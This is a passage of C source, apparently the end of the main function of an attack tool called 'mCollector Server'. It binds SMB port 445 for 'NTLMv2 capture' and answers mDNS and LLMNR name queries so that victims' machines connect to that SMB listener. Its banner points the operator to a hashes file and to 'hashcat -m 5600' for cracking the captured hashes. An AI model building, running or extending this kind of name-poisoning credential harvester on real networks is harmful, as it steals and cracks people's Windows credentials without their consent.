        char *gen_cert = NULL, *gen_key = NULL;
        if (generate_tls_keypair(&gen_cert, &gen_key) == 0) {
            s_tls_cert = mg_str(gen_cert);
            s_tls_key  = mg_str(gen_key);
            printf("[*] Generated ephemeral TLS certificate (CN=mytt.local)\n");
        } else {
            fprintf(stderr, "[-] Failed to generate TLS keypair\n");
            return 1;
        }
    }

    struct mg_mgr mgr; mg_mgr_init(&mgr);

    if (!mg_http_listen(&mgr, "https://0.0.0.0:443", handle_request, NULL))
        { fprintf(stderr, "[-] HTTPS listen failed\n"); return 1; }
    if (!mg_http_listen(&mgr, "http://0.0.0.0:80", handle_redirect, NULL))
        { fprintf(stderr, "[-] HTTP listen failed\n"); return 1; }
    struct mg_connection *lc_smb =
        mg_listen(&mgr, "tcp://0.0.0.0:445", smb_handler, NULL);
    if (!lc_smb)
        fprintf(stderr, "[-] SMB listen failed — "
                        "try: sudo setcap cap_net_bind_service=+ep ./mCollector\n");

    int nr_ok = nr_init(NR_HOSTNAME);

    printf("\n");
    printf("             ██████╗ ██████╗ ██╗     ██╗     ███████╗ ██████╗████████╗ ██████╗ ██████╗ \n");
    printf("            ██╔════╝██╔═══██╗██║     ██║     ██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗\n");
    printf("  ██╗████╗  ██║     ██║   ██║██║     ██║     █████╗  ██║        ██║   ██║   ██║██████╔╝\n");
    printf("  ██╔██╔██╗ ██║     ██║   ██║██║     ██║     ██╔══╝  ██║        ██║   ██║   ██║██╔══██╗\n");
    printf("  ██║╚╝ ██║ ╚██████╗╚██████╔╝███████╗███████╗███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║\n");
    printf("  ╚═╝   ╚═╝  ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝\n");
    printf("                                    S E R V E R\n");
    printf("\n");
    printf("  version   : %s\n", MCOLLECTOR_VERSION);
    printf("  build     : %s\n", MCOLLECTOR_BUILD);
    printf("  hashes    : %-38s  hashcat -m 5600\n", HASHES_FILE);
    load_seen_users();
    printf("\n");
    printf("  %-6s  %-42s  %s\n", "PROTO", "ADDRESS", "PURPOSE");
    printf("  ──────  ──────────────────────────────────────  ───────────────────\n");
    print_local_ips();
    if (s_external_ip[0])
        printf("  %-6s  %-42s  %s\n", "NAT", s_external_ip, "external");
    if (lc_smb)
        printf("  %-6s  %-42s  %s\n", "SMB", "0.0.0.0:445", "NTLMv2 capture");
    if (nr_ok == 0) {
        printf("  %-6s  %-42s  %s\n", "mDNS",  "224.0.0.251:5353",
               NR_HOSTNAME ".local -> SMB");
        printf("  %-6s  %-42s  %s\n", "LLMNR", "224.0.0.252:5355",
               NR_HOSTNAME " -> SMB");
    }
    printf("\n");

    for (;;) {
        mg_mgr_poll(&mgr, 10);
        nr_poll();
    }

    nr_cleanup();
    mg_mgr_free(&mgr);
    return 0;
}



